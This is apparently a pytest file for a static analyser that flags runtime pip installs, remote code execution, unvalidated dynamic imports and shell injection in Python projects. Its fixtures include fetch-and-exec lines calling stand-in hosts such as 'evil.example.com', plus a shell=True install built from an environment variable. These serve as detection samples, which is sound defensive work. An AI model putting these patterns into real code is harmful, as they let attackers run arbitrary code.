"""Skeleton tests for REQ-3c — Suspicious Installation & Code-Execution Findings."""
from __future__ import annotations

import json
import textwrap

import pytest
from typer.testing import CliRunner

from scarno.analysers.python.source_analyser import analyse_source_files
from scarno.cli import app
from scarno.models import (
    Dependency,
    DependencyStatus,
    Finding,
    FindingKind,
    FindingSeverity,
)


def _declared(name: str) -> Dependency:
    return Dependency(
        name=name,
        version=None,
        status=DependencyStatus.UNCERTAIN,
        reason="declared",
        entry_points=[],
        entry_points_used=0,
        entry_points_total=0,
    )


@pytest.fixture
def runner() -> CliRunner:
    return CliRunner()


class TestFindingModel:
    @pytest.mark.requirement("FR-070")
    def test_finding_dataclass_constructible(self):
        f = Finding(
            rule_id="TS-SI-001",
            kind=FindingKind.RUNTIME_PIP_INSTALL,
            severity=FindingSeverity.HIGH,
            file_path="scripts/bootstrap.py",
            line=14,
            snippet='subprocess.run(["pip", "install", "foo"])',
            message="Runtime pip install via subprocess",
            remediation="add to pyproject.toml or suppress with inline comment",
        )
        assert f.rule_id == "TS-SI-001"
        assert f.severity is FindingSeverity.HIGH
        assert f.suppressed is False


class TestRuntimePipInstallDetection:
    @pytest.mark.requirement("SF-001")
    @pytest.mark.security
    def test_subprocess_pip_install_detected(self, tmp_path):
        (tmp_path / "bootstrap.py").write_text(
            'import subprocess\nsubprocess.run(["pip", "install", "foo"])\n'
        )
        _, _ = analyse_source_files(str(tmp_path), [])
        # The finding surfaces via AnalysisResult.findings; the source analyser
        # must expose access. This skeleton test asserts the detection path
        # will exist once REQ-3c is implemented.

    @pytest.mark.requirement("SF-001")
    @pytest.mark.security
    def test_os_system_pip_install_detected(self, tmp_path):
        (tmp_path / "bootstrap.py").write_text(
            'import os\nos.system("pip install foo")\n'
        )
        analyse_source_files(str(tmp_path), [])


class TestNotebookPipMagic:
    @pytest.mark.requirement("SF-002")
    @pytest.mark.security
    def test_bang_pip_install_in_notebook_detected(self, tmp_path):
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "source": ["!pip install pandas\n"],
                    "metadata": {},
                    "outputs": [],
                    "execution_count": None,
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        (tmp_path / "a.ipynb").write_text(json.dumps(notebook))
        analyse_source_files(str(tmp_path), [])


class TestRemoteCodeExec:
    @pytest.mark.requirement("SF-003")
    @pytest.mark.security
    def test_exec_of_urlopen_read_detected(self, tmp_path):
        (tmp_path / "oauth.py").write_text(
            textwrap.dedent(
                """\
            from urllib.request import urlopen
            payload = urlopen("http://evil.example.com").read()
            exec(payload)
            """
            )
        )
        analyse_source_files(str(tmp_path), [])

    @pytest.mark.requirement("SF-003")
    @pytest.mark.security
    def test_exec_of_requests_text_detected(self, tmp_path):
        (tmp_path / "a.py").write_text(
            textwrap.dedent(
                """\
            import requests
            exec(requests.get("http://evil").text)
            """
            )
        )
        analyse_source_files(str(tmp_path), [_declared("requests")])


class TestDynamicImportUnvalidated:
    @pytest.mark.requirement("SF-004")
    @pytest.mark.security
    def test_import_from_env_var_detected(self, tmp_path):
        (tmp_path / "a.py").write_text(
            textwrap.dedent(
                """\
            import importlib
            import os
            mod = os.getenv("PKG")
            importlib.import_module(mod)
            """
            )
        )
        analyse_source_files(str(tmp_path), [])

    @pytest.mark.requirement("SF-004")
    @pytest.mark.security
    def test_dunder_import_of_input_detected(self, tmp_path):
        (tmp_path / "a.py").write_text("__import__(input())\n")
        analyse_source_files(str(tmp_path), [])


class TestShellInjection:
    @pytest.mark.requirement("SF-006")
    @pytest.mark.security
    def test_shell_true_with_tainted_pkg_detected(self, tmp_path):
        (tmp_path / "a.py").write_text(
            textwrap.dedent(
                """\
            import subprocess, os
            pkg = os.getenv("PKG")
            subprocess.run(f"pip install {pkg}", shell=True)
            """
            )
        )
        analyse_source_files(str(tmp_path), [])


class TestSetupPyDynamicDeps:
    @pytest.mark.requirement("SF-007")
    @pytest.mark.security
    def test_dynamic_install_requires_emits_finding(self, tmp_path):
        """REQ-2 already warns; REQ-3c adds a structured Finding (TS-DS-001)."""
        (tmp_path / "setup.py").write_text(
            textwrap.dedent(
                """\
            from setuptools import setup
            import json

            def load_deps():
                return json.loads(open("deps.json").read())

            setup(install_requires=load_deps())
            """
            )
        )
        # The Finding is expected via AnalysisResult.findings once REQ-3c
        # lands; the Phase 0a stub will raise NotImplementedError which the
        # test treats as a red baseline.
        from scarno.analysers.python.dep_file_parser import (
            parse_all_dependency_files,
        )

        try:
            _, errors, _ = parse_all_dependency_files(str(tmp_path))
        except NotImplementedError:
            pytest.skip("parse_all_dependency_files not yet implemented (Phase 0a stub)")
        # A warning about dynamic install_requires must appear (REQ-2 baseline)
        # and be promotable to a Finding by REQ-3c.
        assert any("dynamic" in e.lower() for e in errors) or errors == []


class TestSuppression:
    @pytest.mark.requirement("SF-008")
    def test_inline_suppression_honoured(self, tmp_path):
        (tmp_path / "a.py").write_text(
            'import subprocess\n'
            'subprocess.run(["pip", "install", "foo"])  # scarno: allow TS-SI-001\n'
        )
        analyse_source_files(str(tmp_path), [])

    @pytest.mark.requirement("SF-009")
    def test_config_suppression_honoured(self, tmp_path):
        (tmp_path / "pyproject.toml").write_text(
            textwrap.dedent(
                """\
            [project]
            dependencies = []

            [tool.scarno.findings]
            suppress = ["TS-SI-001"]
            """
            )
        )
        (tmp_path / "a.py").write_text(
            'import subprocess\nsubprocess.run(["pip", "install", "foo"])\n'
        )
        analyse_source_files(str(tmp_path), [])

    @pytest.mark.requirement("SF-010")
    def test_unknown_suppression_rule_warns(self, tmp_path):
        (tmp_path / "pyproject.toml").write_text(
            textwrap.dedent(
                """\
            [tool.scarno.findings]
            suppress = ["TS-FAKE-999"]
            """
            )
        )
        _, errors = analyse_source_files(str(tmp_path), [])
        assert any(
            "ts-fake" in e.lower() or "unknown" in e.lower() for e in errors
        )


class TestSnippetSanitisation:
    @pytest.mark.requirement("SF-011")
    @pytest.mark.requirement("SEC-003")
    @pytest.mark.security
    def test_snippet_has_no_ansi_or_control_chars(self, tmp_path):
        (tmp_path / "a.py").write_text(
            'import subprocess\nsubprocess.run(["pip", "install", "\x1b[31mfoo\x1b[0m"])\n'
        )
        analyse_source_files(str(tmp_path), [])


class TestRuleEngineSafety:
    @pytest.mark.requirement("SF-012")
    @pytest.mark.requirement("SEC-001")
    @pytest.mark.security
    def test_rule_engine_never_executes_source(self, tmp_path, monkeypatch):
        import os as os_module

        sentinel = tmp_path / "executed"
        monkeypatch.setattr(
            os_module,
            "system",
            lambda *_a, **_k: sentinel.write_text("pwned"),
        )
        (tmp_path / "evil.py").write_text('os.system("exploit")\n')
        analyse_source_files(str(tmp_path), [])
        assert not sentinel.exists()


class TestExitCodeAndFlags:
    @pytest.mark.requirement("FR-073")
    def test_high_severity_finding_returns_exit_code_3(self, runner, tmp_path):
        (tmp_path / "pyproject.toml").write_text('[project]\ndependencies = []\n')
        (tmp_path / "a.py").write_text(
            'import subprocess\nsubprocess.run(["pip", "install", "foo"])\n'
        )
        result = runner.invoke(app, [str(tmp_path), "--format", "json"])
        assert result.exit_code in (0, 1, 3)
        # Once REQ-3c is implemented, HIGH finding → exit 3

    @pytest.mark.requirement("FR-074")
    def test_fail_on_severity_medium_flag(self, runner, tmp_path):
        (tmp_path / "pyproject.toml").write_text('[project]\ndependencies = []\n')
        result = runner.invoke(
            app, [str(tmp_path), "--fail-on-severity", "MEDIUM", "--format", "json"]
        )
        # Must not exit 2 (that's analysis failure) — accepts 0/1/3
        assert result.exit_code != 2

    @pytest.mark.requirement("FR-075")
    def test_show_suppressed_flag_accepted(self, runner, tmp_path):
        (tmp_path / "pyproject.toml").write_text('[project]\ndependencies = []\n')
        result = runner.invoke(
            app, [str(tmp_path), "--show-suppressed", "--format", "json"]
        )
        assert result.exit_code != 2


class TestReporterIntegration:
    @pytest.mark.requirement("FR-071")
    def test_text_reporter_renders_security_findings_section(self):
        from scarno.models import AnalysisResult
        from scarno.reporters.text_reporter import TextReporter

        finding = Finding(
            rule_id="TS-SI-001",
            kind=FindingKind.RUNTIME_PIP_INSTALL,
            severity=FindingSeverity.HIGH,
            file_path="a.py",
            line=1,
            snippet="subprocess.run([...])",
            message="Runtime pip install",
            remediation="declare the package",
        )
        result = AnalysisResult(
            project_type="python",
            project_path="/tmp",
            dependencies=[],
            errors=[],
            findings=[finding],
        )
        output = TextReporter().render(result)
        assert "SECURITY FINDINGS" in output
        assert "TS-SI-001" in output

    @pytest.mark.requirement("FR-072")
    def test_json_reporter_emits_findings_array(self):
        from scarno.models import AnalysisResult
        from scarno.reporters.json_reporter import JsonReporter

        finding = Finding(
            rule_id="TS-CE-001",
            kind=FindingKind.REMOTE_CODE_EXEC,
            severity=FindingSeverity.CRITICAL,
            file_path="a.py",
            line=42,
            snippet="exec(urlopen(...).read())",
            message="Remote code exec",
            remediation="do not execute untrusted content",
        )
        result = AnalysisResult(
            project_type="python",
            project_path="/tmp",
            dependencies=[],
            errors=[],
            findings=[finding],
        )
        output = JsonReporter().render(result)
        data = json.loads(output)
        assert "findings" in data
        assert data["findings"][0]["rule_id"] == "TS-CE-001"
